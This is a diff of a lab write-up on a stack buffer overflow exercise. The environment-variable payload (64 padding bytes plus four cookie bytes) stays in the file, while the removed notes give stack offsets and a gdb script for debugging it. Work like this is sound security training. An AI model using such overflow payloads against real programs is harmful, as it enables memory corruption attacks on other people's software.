@@ -29,16 +29,4 @@ GREENIE="$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x0d\
 ## Why it works
 The 64 padding bytes fill the buffer; the next 4 bytes set the `modified` cookie to the value expected by the comparison.
 
-## Extra notes
-- The vulnerable input comes from the `GREENIE` environment variable, not argv or stdin.
-- `strcpy` copies the environment value into a 64-byte stack buffer. The cookie is at `[esp+0x58]`, 64 bytes after `[esp+0x18]`.
-- Debug:
-```bash
-export GREENIE="$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x0d\x0a\x0d")')"
-gdb -q ./bin <<'GDB_EOF'
-b *0x080484e4
-run
-x/4xw $esp+0x58
-GDB_EOF
-```
-- Expected success message: `you have correctly modified the variable`.
+
